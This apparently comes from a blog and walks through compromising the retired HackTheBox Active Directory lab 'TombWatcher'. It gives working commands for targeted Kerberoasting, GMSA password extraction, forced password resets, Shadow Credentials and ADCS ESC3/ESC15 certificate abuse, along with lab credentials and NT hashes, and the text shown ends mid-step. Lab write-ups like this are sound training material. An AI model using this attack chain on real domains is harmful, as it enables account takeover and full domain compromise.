---
layout: post
title: "TombWatcher (Retired Box)"
date: 2025-11-19 10:00:00 +01:00
categories: ["HackTheBox", "Active Directory Labs", "Official CPTS Prep"]
tags: [
  "CPTS",
  "active directory",
  "bloodhound",
  "kerberoasting",
  "gmsa",
  "forcechangepassword",
  "shadow credentials",
  "adcs",
  "esc3",
  "esc15",
  "certipy",
  "ldap",
  "windows"
]
image: /assets/img/posts/CPTS-prep/tombwatcher/tombwatcher.png 
permalink: /tombwatcher/
redirect_from:
  - /posts/TombWatcher/
draft: false
excerpt: "This walkthrough covers Targeted Kerberoasting via WriteSPN, GMSA password extraction, ForceChangePassword abuse, Shadow Credentials, AD Recycle Bin recovery, and an ADCS escalation chain leading to full domain compromise." 
---

## Overview

We start TombWatcher with valid domain credentials, but that’s only a doorway. The push to Domain Admin is a stacked escalation driven by AD object control and certificate gaps. Using BloodHound to map the path, we move from Kerberoasting to a leaked GMSA credential, then into ForceChangePassword abuse that lets us plant a shadow credential. From there, we dig through the AD Recycle Bin and uncover a deleted ADCS admin account sitting in plain sight. Restoring that account allows us to abuse ESC15 to take full control of the domain.

---
## Recon

I begin my scan by creating a dedicated directory for Nmap results. This keeps things organized and lets me easily return to previous scans later without confusion.

**Nmap Output**:

```shell
Nmap scan report for 10.129.232.167
Host is up, received echo-reply ttl 127 (0.0083s latency).
Scanned at 2025-11-17 01:49:21 CST for 218s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-17 11:51:29Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-17T11:53:01+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-11-17T11:40:39
| Not valid after:  2026-11-17T11:40:39
| MD5:   1d6c:e9c7:7209:bdde:ca91:74a9:aa1e:833c
| SHA-1: 81bd:a2a4:ef93:5ec3:db1b:8c46:0ab2:eaf2:b1da:c50b
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAN7Kti3c/l8tQAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjUxMTE3MTE0MDM5
<SNIP>
| czsRn1s/MBE+rzRT4/iHJoMkfyDcOEprMuYljt5YxIhk9uYOLevhvdryYO/ZnOsy
| 55ExOCfFuqZ8AZMsd2WaXvTXXwdavztaZXQidTvDfRT7mE2Sma+KWz2TfJBTccUl
| AkpUP5U0dFKalJAI6SkzEl2MU/Sa/+wW6k+P
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-11-17T11:40:39
| Not valid after:  2026-11-17T11:40:39
| MD5:   1d6c:e9c7:7209:bdde:ca91:74a9:aa1e:833c
| SHA-1: 81bd:a2a4:ef93:5ec3:db1b:8c46:0ab2:eaf2:b1da:c50b
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAN7Kti3c/l8tQAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
<SNIP>
| czsRn1s/MBE+rzRT4/iHJoMkfyDcOEprMuYljt5YxIhk9uYOLevhvdryYO/ZnOsy
| 55ExOCfFuqZ8AZMsd2WaXvTXXwdavztaZXQidTvDfRT7mE2Sma+KWz2TfJBTccUl
| AkpUP5U0dFKalJAI6SkzEl2MU/Sa/+wW6k+P
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-17T11:53:01+00:00; +4h00m02s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-11-17T11:40:39
| Not valid after:  2026-11-17T11:40:39
| MD5:   1d6c:e9c7:7209:bdde:ca91:74a9:aa1e:833c
| SHA-1: 81bd:a2a4:ef93:5ec3:db1b:8c46:0ab2:eaf2:b1da:c50b
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAN7Kti3c/l8tQAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjUxMTE3MTE0MDM5
<SNIP>
| czsRn1s/MBE+rzRT4/iHJoMkfyDcOEprMuYljt5YxIhk9uYOLevhvdryYO/ZnOsy
| 55ExOCfFuqZ8AZMsd2WaXvTXXwdavztaZXQidTvDfRT7mE2Sma+KWz2TfJBTccUl
| AkpUP5U0dFKalJAI6SkzEl2MU/Sa/+wW6k+P
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-17T11:53:01+00:00; +4h00m02s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-11-17T11:40:39
| Not valid after:  2026-11-17T11:40:39
| MD5:   1d6c:e9c7:7209:bdde:ca91:74a9:aa1e:833c
| SHA-1: 81bd:a2a4:ef93:5ec3:db1b:8c46:0ab2:eaf2:b1da:c50b
| -----BEGIN CERTIFICATE-----
| MIIGRzCCBS+gAwIBAgITLgAAAAN7Kti3c/l8tQAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjUxMTE3MTE0MDM5
<SNIP>
| czsRn1s/MBE+rzRT4/iHJoMkfyDcOEprMuYljt5YxIhk9uYOLevhvdryYO/ZnOsy
| 55ExOCfFuqZ8AZMsd2WaXvTXXwdavztaZXQidTvDfRT7mE2Sma+KWz2TfJBTccUl
| AkpUP5U0dFKalJAI6SkzEl2MU/Sa/+wW6k+P
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-17T11:53:01+00:00; +4h00m02s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50747/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
50764/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52925/tcp): CLEAN (Timeout)
|   Check 2 (port 14811/tcp): CLEAN (Timeout)
|   Check 3 (port 60904/udp): CLEAN (Timeout)
|   Check 4 (port 14103/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-17T11:52:21
|_  start_date: N/A
```

**Key findings**:
- IIS on port 80 but nothing useful for initial foothold
- Classic AD footprint: Kerberos, LDAP/LDAPS, SMB, WinRM
- Active ADCS infrastructure visible from certificate metadata
- LDAP over multiple ports confirms this is a full domain controller (DC01)

To proceed, I’ll add the discovered domain entries from the scan to `/etc/hosts` so everything resolves properly.

```shell
echo "10.129.232.167 DC01.tombwatcher.htb tombwatcher.htb DC01" | sudo tee -a /etc/hosts
```
---

## Enumeration

I start by checking the web server, but it’s just the default IIS landing page, nothing useful. Since we already have credentials, the next step is to test them against the exposed services.

```shell
nxc winrm DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'   # No luck
nxc ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'   # Works!
nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'    # Works too!
```

With SMB access confirmed, I enumerate the available shares:

```shell
└──╼ [★]$ nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares

SMB          10.129.232.167 445   DC01   [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB          10.129.232.167 445   DC01   [*] Enumerated shares

Share        Permissions   Remark
-----        -----------   ------
ADMIN$       -             Remote Admin
C$           -             Default share
IPC$         READ          Remote IPC
NETLOGON     READ          Logon server share
SYSVOL       READ          Logon server share
```

Nothing interesting shows up in the shares, so I move on to enumerating users.

```shell
└──╼ [★]$ nxc smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users

SMB          10.129.232.167 445   DC01   [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB          10.129.232.167 445   DC01   [*] Enumerated domain users

Username        Last PW Set             BadPW    Description
-----------     ----------------------  ------   --------------------------------
Administrator   2025-04-25 14:56:03     0        Built-in account
Guest           <never>                 0        Built-in guest account
krbtgt          2024-11-16 00:02:28     0        Kerberos KDC service account
Henry           2025-05-12 15:17:03     0
Alfred          2025-05-12 15:17:03     0
sam             2025-05-12 15:17:03     0
john            2025-05-19 13:25:10     0

```

There are four users visible but nothing here gives an obvious foothold yet so the next step is deeper LDAP and BloodHound collection.

### BloodHound collection

To dig deeper into the domain, I collect a full set of AD objects using both rusthound-ce and bloodhound-python.

>**Tip:** rusthound-ce is faster and more complete on modern environments, while bloodhound-python still picks up certain edges RustHound can miss. Running both gives broader coverage and avoids blind spots.
{: .prompt-tip }

```shell
rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All
# and 
bloodhound-python -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -ns 10.129.232.167
```

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/01.png' | relative_url }})

With the data ingested and visualized in BloodHound, I search for the **Henry** user, mark them as owned, and check **Outbound Control** to see what Henry can influence. That immediately reveals another user: `alfred`

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/02.png' | relative_url }})

Henry has **WriteSPN** rights over `alfred`.

**Note:** Anyone with **WriteSPN** can attach a fake SPN to the target account and Kerberoast it. This is a direct path to attempting credential extraction against `alfred`.

---
## Pivoting to Alfred

To launch the Kerberoast attack, I use a **targeted Kerberoasting** approach. This technique lets you add an SPN to any account you control via **WriteSPN**, roast the account, and then remove the SPN afterward. Alfred is a regular domain user, but since Henry has **WriteSPN** over him, I can turn Alfred into a Kerberoastable target and check whether he’s using a weak password.

The easiest tool for this is **targetedKerberoast.py**, which automates the entire sequence (add SPN → request ticket → extract hash → remove SPN). 

For this box, I’m using **BloodyAD** with **NetExec**, which gives more visibility into each step.

---
### Setting Up BloodyAD

```shell
git clone https://github.com/CravateRouge/bloodyAD
cd bloodyAD
# Create and activate a virtual environment
python3 -m venv .venv
source .venv/bin/activate 
# from the project root
python3 -m pip install --upgrade pip
python3 -m pip install -r requirements.txt
# then install the package itself so imports like "from bloodyAD import ..." work
python3 -m pip install -e .
```

### Fixing Time Skew
Before interacting with Kerberos, I sync my clock with the DC:

```shell
└──╼ [★]$ sudo ntpdate 10.129.232.167
2025-11-17 09:07:38.629500 (-0600) +14402.200183 +/- 0.004360 10.129.232.167 s1 no-leap
CLOCK: time stepped by 14402.200183
```
---
### Kerberoasting Alfred

First I add a fake SPN to Alfred:

```
(.venv)
└──╼ [★]$ python3 bloodyAD.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/abc'
[+] alfred's servicePrincipalName has been updated
```

Now that Alfred has an SPN, NetExec can dump a roastable hash:

```
nxc ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --kerberoasting -
```

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/03.png' | relative_url }})

Once I grab and save the hash, I can cleanup the SPN by setting it to nothing (though there’s a cleanup script that will do it as well):

```shell
(.venv) 
└──╼ [★]$ python3 bloodyAD.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName
[+] alfred's servicePrincipalName has been updated
```
### Cracking the hash

```
 hashcat hash /usr/share/wordlists/rockyou.txt
```

Result : `alfred: basketball`

### Validating the creds

```shell
nxc winrm DC01.tombwatcher.htb -u alfred -p basketball   # No luck
nxc smb DC01.tombwatcher.htb -u alfred -p basketball    # Works!
```

Alfred can authenticate over SMB, which confirms the password and gives us a foothold to continue enumerating the domain from his perspective.

---
## Pivoting to ANSIBLE_DEV$

After validating Alfred’s credentials, I checked the available shares, but everything was default and useless. With nothing to leverage there, I went back to BloodHound to analyze what Alfred could directly influence.

BloodHound showed that Alfred had **AddSelf** rights on the **Infrastructure** group. That group had **ReadGMSAPassword** permissions on the **ANSIBLE_DEV$** GMSA account. That’s a clear escalation point, so the next step was to see how it connected to a full privilege chain.

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/04.png' | relative_url }})

Switching to **Outbound Control** laid out the attack path cleanly:

**Alfred → Infrastructure → ANSIBLE_DEV$ → sam → john**

That gives a solid, multi-stage route to escalate privileges step by step.

---
### Abusing AddSelf to Access ANSIBLE_DEV$

With Alfred’s [AddSelf](https://www.hackingarticles.in/addself-active-directory-abuse/) rights over the **Infrastructure** group, the next move is to add `Alfred` into that group so I can inherit its permissions. Since Infrastructure has **ReadGMSAPassword** rights over `ANSIBLE_DEV$`, joining the group will let me extract the GMSA password directly.

### Adding Alfred to the Infrastructure Group

Using Alfred’s **AddSelf** rights, I add him to the Infrastructure group so he inherits its ability to read the ANSIBLE_DEV$ GMSA password.

```shell
(.venv)
└──╼ [★]$ python3 bloodyAD.py -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred
[+] alfred added to Infrastructure
```

With that done, I can now dump the GMSA password:

```shell
netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
```

This reveals the NTLM hash for **ANSIBLE_DEV$**:

```
73009e35da7dcea73e835d695e76a836
```
### Validate NTLM

To confirm the hash is correct, I test over SMB:

```shell
nxc smb DC01.tombwatcher.htb -u 'ANSIBLE_DEV$' -H 73009e35da7dcea73e835d695e76a836 # works!
```

---
## Pivoting to Sam

ANSIBLE_DEV$ has **ForceChangePassword** rights over **sam**, so I reset sam’s password:

```shell
(.venv) 
└──╼ [★]$ python3 bloodyAD.py -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':73009e35da7dcea73e835d695e76a836' --host dc01.tombwatcher.htb set password "sam" "Password123."
[+] Password changed successfully!
```

To confirm validation , I test over SMB:

```shell
nxc smb DC01.tombwatcher.htb -u sam -H 'Password123.'                   # works!
```

---
## Pivoting to John

The last step in this BloodHound chain is **sam**’s **WriteOwner** privilege over **john**. With WriteOwner, sam can take ownership of the john account. Once you own an object in AD, you can rewrite its ACLs and give yourself whatever permissions you want.

```shell
(.venv)
└──╼ [★]$ python3 bloodyAD.py -d tombwatcher.htb -u sam -p 'Password123.' --host dc01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```

Now that sam owns the john account, he can assign himself full control:

```shell
(.venv) 
└──╼ [★]$ python3 bloodyAD.py -d tombwatcher.htb -u sam -p 'Password123.' --host dc01.tombwatcher.htb add genericAll john sam
[+] sam has now GenericAll on john 
```

>Tip: With **GenericAll** over john, sam has unrestricted control over password resets, SPN manipulation, shadow credentials, the works.
{: .prompt-tip }

---
### Dropping Shadow Credential on John

With **GenericAll** over **john**, I can perform a Shadow Credential attack. This abuses the KeyCredentialLink attribute to add a rogue authentication method to the account, allowing me to authenticate as john without knowing his password.

>Tip: Certipy automates the entire process. It generates a certificate, inject a malicious key credential, authenticate, extract the NT hash, and restore the original KeyCredentialLink afterward.
{: .prompt-info }

```shell
certipy shadow auto -u sam@tombwatcher.htb -p 'Password123.' -account john -dc-ip 10.129.232.167

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '85478516-51f1-8a2a-d131-7b39d4de77d0'
[*] Adding Key Credential with device ID '85478516-51f1-8a2a-d131-7b39d4de77d0' to the Key Credentials for 'john'
[*] Successfully added Key Credential...
[*] Authenticating as 'john' with the certificate
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf
```

Next, I validate creds against the usual suspects and we have winrm open on John:

```shell
nxc winrm dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf # Works!
nxc smb dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf  # Works!
```

---
## Shell

With john’s NT hash, I can authenticate directly over WinRM and get an interactive shell:

```shell
evil-winrm -i dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
```

Once inside, I enumerate the user directories to confirm access and pull the user flag:

```powershell
PS C:\Users> tree /f /a
Folder PATH listing
Volume serial number is EFB6-9D96
C:.
+---.NET v4.5
+---.NET v4.5 Classic
+---Administrator
+---john
|   +---Desktop
|   |       user.txt
|   |
|   +---Documents
|   +---Downloads
|   +---Favorites
|   +---Links
|   +---Music
|   +---Pictures
|   +---Saved Games
|   \---Videos
|
\---Public
```

---
## Escalating to Admin

With a shell as **john**, I start checking for any straightforward local privilege escalation routes, but nothing useful turns up. That sends me back to the BloodHound graph to see what’s left. The only notable edge is that john has **GenericAll** over the **ADCS OU** (Organizational Unit). In theory, that gives full control over the **OU**, but none of the certificate templates inside it are vulnerable, so this doesn’t immediately translate into an escalation path.

At this point, the connection between GenericAll on the **ADCS OU** and a workable privilege escalation route isn’t obvious. To dig deeper, I start collecting detailed **ADCS** information to look for hidden misconfigurations.

I use **certipy find** to enumerate everything related to certificate services:

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/05.png' | relative_url }})


There’s a single CA in the environment, **tombwatcher-CA-1**, and it exposes eleven certificate templates. Most of them are noise, but the **Machine** template stands out as potentially useful.

Since I already compromised **ANSIBLE_DEV$**, which is a member of **Domain Computers**, I have enrollment rights for the Machine template. Certipy flags this as _potentially_ relevant for **ESC2** or **ESC3**, but by itself it doesn’t give a clean escalation path.

One detail jumps out though: one of the object control entries is displayed only by **SID**, not by name:

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/06.png' | relative_url }})

```
S-1-5-21-1392491010-1358638721-2126982587-1111
```

That usually means certipy couldn’t resolve the object to an active user or group.

>**Tip:**  When Certipy or BloodHound shows a SID instead of a username, it often indicates a **deleted** object. Deleted AD objects linger in the [Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin?tabs=powershell), and their metadata can still appear in ACLs even though they’re not active.
{: .prompt-tip }

---
### Recovering the Deleted ADCS Admin

To verify whether the SID shown by Certipy belongs to a deleted object, I query it directly from my Evil-WinRM shell.

First, I check if the object exists in the active directory tree:

```shell
*Evil-WinRM* PS C:\> Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"
Cannot find an object with identity: 'S-1-5-21-1392491010-1358638721-2126982587-1111' under: 'DC=tombwatcher,DC=htb'
```

Since the object doesn’t exist normally, I search the **Recycle Bin**:

```powershell
*Evil-WinRM* PS C:\Users\john> Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects
```

This returns the deleted object record, including its **ObjectGUID**. I use that GUID to restore the account:

```powershell
*Evil-WinRM* PS C:\Users\john> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Now I retrieve the restored account to confirm:

```powershell
*Evil-WinRM* PS C:\Users\john> Get-ADUser cert_admin


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :

*Evil-WinRM* PS C:\Users\john> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'Password123.' -AsPlainText -Force)
*Evil-WinRM* PS C:\Users\john> 
```

With the **cert_admin** account restored, I reset its password:

```
*Evil-WinRM* PS C:\Users\john> Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'Password123.' -AsPlainText -Force)
```

I test to validate the change:

```shell
nxc smb dc01.tombwatcher.htb -u cert_admin -p 'Password123.'         # works!
```

---

## Attempting ESC15

ow that **cert_admin** is restored, I re-run Certipy to check for any exploitable templates:

```shell
certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'Password123.' -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

Certipy correctly resolves the previously missing SID and shows the **WebServer** template as vulnerable to **ESC15**.

---
### ESC15 exploit failed

Following the Certipy documentation, I attempt to exploit ESC15 using the recommended syntax from [certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) :

```shell
certipy req -u cert_admin -p 'Password123.' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -sid 'S-1-5-21-1392491010-1358638721-2126982587-500'  -application-policies 'Client Authentication'
```

I got the SID from bloodhound:

![Title card]({{ 'assets/img/posts/CPTS-prep/tombwatcher/02.png' | relative_url }})

Despite that, the request failed every single time. No matter how I adjusted the parameters, Certipy refused to issue the malicious certificate. Whether it was CA restrictions, some quiet hardening in the environment, or just quirks in the ESC15 workflow, I couldn’t pin it down.

> **Side note:** There are claims that you can LDAP-shell over Schannel and downgrade SSL on your host to make ESC15 behave, but I didn’t validate whether that applies to this box.
{: .prompt-info }

At this point, ESC15 clearly wasn’t cooperating, so I stepped back and pivoted to a different angle.

---
## Escalating to Domain Admin via ESC3
I found a reliable workaround through a video covering this box on [IppSec’s YouTube channel](https://www.youtube.com/watch?v=um8b-TN76bY&t=1975s). He also includes a _Beyond Root_ segment where he fixes the `CA_MD_TOO_WEAK` error by using a custom OpenSSL config. If you run into the same issue, it’s worth checking out.

>**Note:** The **cert_admin** password doesn’t persist. It eventually reverts, so if Certipy starts throwing errors again, jump back into Evil-WinRM and reset the password before continuing.
{: .prompt-info }

With IppSec’s method, I was able to finish the escalation cleanly:

```shell
certipy req -u cert_admin -p 'Password123.' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1
```

Using the **User** template, I request a certificate _on behalf of_ the built-in Administrator:

```shell
certipy req -u cert_admin -p 'Password123.' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now that I have a **legitimate Administrator PFX**, I authenticate directly:

```shell
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72

